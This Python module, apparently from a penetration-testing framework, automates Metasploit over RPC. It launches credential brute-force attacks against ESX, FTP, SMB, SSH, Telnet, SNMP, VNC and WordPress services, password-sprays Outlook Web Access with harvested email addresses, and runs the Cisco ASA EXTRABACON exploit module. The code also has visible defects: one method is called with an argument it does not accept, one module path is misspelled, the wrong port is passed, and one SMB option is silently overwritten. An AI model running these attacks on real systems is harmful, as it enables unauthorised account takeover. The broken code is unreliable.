import json
import sys

from common import print_text, common
from tools.metasploit.metasploit_class import MetasploitClass

def metasploit_run(command, scope_id, location_id, db_object, log_id, metasploit_args):
    """ Connect to Metasploit RFC and execute """

    try:
        metasploit_values = json.loads(metasploit_args)

        # Grab metasploit module
        log_info = db_object.view("Log", None, ["id"], [log_id])
        log_source = log_info[0]['source']
        module = log_source[log_source.find("(") + 1:]
        if "metasploit" in module:
            module = module[module.find("metasploit") + 10:]
        module = module[:module.find(")")].strip()

        command = command.replace('"', '')
        output_file_path = log_info[0]['output_filepath']
        target = command[command.find(";")+1:]

        print("25 attack/metasploit_run command: " + str(command))
        rhosts_file = None
        if "--" in target:
            rhosts_file = target[:target.find("--")]
            target = target[target.find("--") + 2:]

        target_port = None
        if ":" in target:
            target_port = target[target.find(":")+1:]
            target = target[:target.find(":")]

        if target_port is not None and "," in target_port:
            target_port = target_port[:target_port.find(",")]

        # Output file name
        formatted_module = module
        if " " in formatted_module:
            formatted_module = formatted_module.replace(" ", "_")
        output_file = output_file_path + "metasploit_" + formatted_module + "__" + str(log_id) + "__" + target.replace("/", "_")
        if target_port is not None:
            output_file = output_file + "-" + str(target_port)
        output_file = output_file + ".txt"

        # Get client name to be used to name scan + target
        client_name = db_object.grab_column_from_single_record("Engagement", ["id"], [1], "client_name")

        common.create_path(output_file_path)

        print("54 metasploit_run metasploit_values: " + str(metasploit_values))

        with MetasploitAutomation(metasploit_values, output_file, client_name, target, target_port, log_id, db_object, rhosts_file) as metasploit_scan:
            if module == "bruteforce esx":
                return metasploit_scan.esx_bruteforce()
            elif module == "bruteforce ftp":
                return metasploit_scan.ftp_bruteforce()
            elif module == "anonymous smb":
                return metasploit_scan.smb_anonymous()
            elif module == "bruteforce smb":
                return metasploit_scan.smb_bruteforce()
            elif module == "bruteforce ssh":
                return metasploit_scan.ssh_bruteforce()
            elif module == "bruteforce telnet":
                return metasploit_scan.telnet_bruteforce()
            elif module == "bruteforce snmp":
                return metasploit_scan.snmp_bruteforce()
            elif module == "bruteforce vnc":
                return metasploit_scan.vnc_bruteforce()
            elif module == "bruteforce wordpress":
                return metasploit_scan.wordpress_bruteforce()
            elif module == "extrabacon asa":
                return metasploit_scan.extrabacon_asa_exploit()
            elif module == "bruteforce owa single password":
                return metasploit_scan.owa_bruteforce_single_password(metasploit_values)
            elif module == "vnc no auth":
                return metasploit_scan.vnc_no_auth(metasploit_values)

    except Exception as e:
        print_text.print_error("metasploit_run except: " +  str(e) +  " Error on line {}".format(sys.exc_info()[-1].tb_lineno))


class MetasploitAutomation():
    def __init__(self, metasploit_values, output_file, client_name, target, target_port, log_id, db_object, rhosts_file):
        self.url = metasploit_values['msfrpc_url']
        self.port = metasploit_values['msfrpc_port']

        self.rhosts_file = rhosts_file
        self.output_file = output_file
        self.client_name = client_name
        self.target = target
        self.target_port = target_port
        self.log_id = log_id
        self.db_object = db_object
        self.token = None
        self.user = metasploit_values['msfrpc_user']
        self.passwd = metasploit_values['msfrpc_password']
        self.user_list = None
        if "msfrpc_userlist" in metasploit_values:
            self.user_list = metasploit_values['msfrpc_userlist']
        self.word_list = None
        if "msfrpc_wordlist" in metasploit_values:
            self.word_list = metasploit_values['msfrpc_wordlist']

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        return self

    def bruteforce(self, use_statement, set_statements):
        try:
            # replace set RHOSTS with file
            if self.rhosts_file is not None:
                set_statements[0] = "set RHOSTS file:" + self.rhosts_file
            set_statements[1] = "set VERBOSE true"

            with MetasploitClass(self.output_file, self.passwd, self.url, self.user, self.port, uri="/api/") as m_class:
                output = m_class.console_module(use_statement, set_statements)

                if output is not None:
                    with open(self.output_file, 'w') as of:
                        of.write(output)

        except Exception as e:
            print_text.print_error(
                "tool metasploit_run except: " + str(e) + " Error on line {}".format(sys.exc_info()[-1].tb_lineno))

    def esx_bruteforce(self):
        use_statement = "use auxiliary/scanner/vmware/vmware_http_login"
        set_statements = ["set RHOSTS " + self.target, "set THREADS 20",
                          "set USER_FILE " + self.user_list, "set PASS_FILE " + self.word_list, "exploit"]
        if self.target_port is not None:
            set_statements.insert(1, "set PORT " + str(self.port))
            set_statements.insert(2, "set RPORT " + str(self.target_port))
        self.bruteforce(use_statement, set_statements)

    def ftp_bruteforce(self):
        use_statement = "use auxiliary/scanner/ftp/ftp_login"
        set_statements = ["set RHOSTS " + self.target, "set THREADS 20", "set USER_FILE " + self.user_list,
                          "set PASS_FILE " + self.word_list, "exploit"]
        if self.target_port is not None:
            set_statements.insert(1, "set PORT " + str(self.port))
            set_statements.insert(2, "set RPORT " + str(self.target_port))
        self.bruteforce(use_statement, set_statements)

    def smb_anonymous(self):
        use_statement = "use auxiliary/scanner/smb/smb_login"
        set_statements = ["set RHOSTS " + self.target, "set smbuser administrator",
                          "set BLANK_PASSWORDS true", "set smbdomain localhost", "exploit"]
        if self.target_port is not None:
            set_statements.insert(1, "set PORT " + str(self.port))
        self.bruteforce(use_statement, set_statements)

    def smb_bruteforce(self):
        use_statement = "use auxiliary/scanner/smb/smb_login"
        set_statements = ["set RHOSTS " + self.target, "set THREADS 20",
                          "set USER_FILE " + self.user_list, "set PASS_FILE " + self.word_list, "exploit"]
        if self.target_port is not None:
            set_statements.insert(1, "set PORT " + str(self.port))
        self.bruteforce(use_statement, set_statements)

    def ssh_bruteforce(self):
        use_statement = "use auxiliary/scanner/ssh/ssh_login"
        set_statements = ["set RHOSTS " + self.target, "set THREADS 20",
                          "set USER_FILE " + self.user_list, "set PASS_FILE " + self.word_list, "exploit"]
        if self.target_port is not None:
            set_statements.insert(1, "set PORT " + str(self.port))
            set_statements.insert(2, "set RPORT " + str(self.target_port))
        self.bruteforce(use_statement, set_statements)

    def telnet_bruteforce(self):
        use_statement = "use auxiliary/scanner/telnet/telnet_login"
        set_statements = ["set RHOSTS " + self.target, "set THREADS 20",
                          "set USER_FILE " + self.user_list, "set PASS_FILE " + self.word_list, "exploit"]
        if self.target_port is not None:
            set_statements.insert(1, "set PORT " + str(self.port))
            set_statements.insert(2, "set RPORT " + str(self.target_port))
        self.bruteforce(use_statement, set_statements)

    def snmp_bruteforce(self):
        use_statement = "use auxiliary/scanner/snmp/snmp_login"
        set_statements = ["set RHOSTS " + self.target, "set THREADS 20",
                          "set BRUTEFORCE_SPEED 3", "set VERSION all",
                          "set PASS_FILE " + self.db_object.base_path + "/tools/attack/snmp_string.txt", "exploit"]
        if self.target_port is not None:
            set_statements.insert(1, "set PORT " + str(self.port))
        self.bruteforce(use_statement, set_statements)

    def vnc_bruteforce(self):
        use_statement = "use auxiliary/scanner/vnc/vnc_login"
        set_statements = ["set RHOSTS " + self.target, "set THREADS 20", "set BLANK_PASSWORDS true",
                          "set USER_FILE " + self.user_list, "set PASS_FILE " + self.word_list, "exploit"]
        if self.target_port is not None:
            set_statements.insert(1, "set PORT " + str(self.port))
            set_statements.insert(2, "set RPORT " + str(self.target_port))
        self.bruteforce(use_statement, set_statements)

    def vnc_no_auth(self):
        use_statement = "use auxilliary/scanner/vnc/vnc_none_auth"
        set_statements = ["set RHOSTS " + self.target, "set THREADS 20", "set BLANK_PASSWORDS true", "exploit"]
        if self.target_port is not None:
            set_statements.insert(1, "set PORT " + str(self.port))
            set_statements.insert(2, "set RPORT " + str(self.target_port))
        self.bruteforce(use_statement, set_statements)

    def wordpress_bruteforce(self):
        use_statement = "use auxiliary/scanner/http/wordpress_login_enum"
        set_statements = ["set RHOSTS " + self.target, "set THREADS 20",
                          "set USER_FILE " + self.user_list, "set PASS_FILE " + self.word_list, "exploit"]
        if self.target_port is not None:
            set_statements.insert(1, "set PORT " + str(self.port))
            set_statements.insert(2, "set RPORT " + str(self.target_port))
        self.bruteforce(use_statement, set_statements)

    # Other 'attack' modules
    def extrabacon_asa_exploit(self):
        use_statement = "use auxiliary/admin/cisco/cisco_asa_extrabacon"
        set_statements = ["set RHOST " + self.target,
                          "set community " + self.user_list, "exploit"]
        self.bruteforce(use_statement, set_statements)

    # OWA Bruteforce (using single password)
    def owa_bruteforce_single_password(self, metasploit_values):
        userlist_file = metasploit_values['userlist_file']
        if userlist_file is None or userlist_file == "":
            # Grab people from Person Table in TE
            people = self.db_object.view("Person", None, ["email"], ["@"], False)
            host_file = self.output_file
            if "output/" in host_file:
                host_file = host_file[:host_file.find("output/")] + "hosts/users.txt"
            if len(people) > 0:
                with open(host_file, 'w') as usrs:
                    for p in people:
                        usrs.write(p["email"] + "\n")
                userlist_file = host_file
        use_statement = "use auxiliary/scanner/http/owa_ews_login"
        set_statements = ["set RHOSTS " + metasploit_values['owa_server'],
                          "set PORT 443",
                          "set USER_FILE " + userlist_file,
                          "set PASSWORD " + metasploit_values['single_password'],
                          "exploit"]
        self.bruteforce(use_statement, set_statements)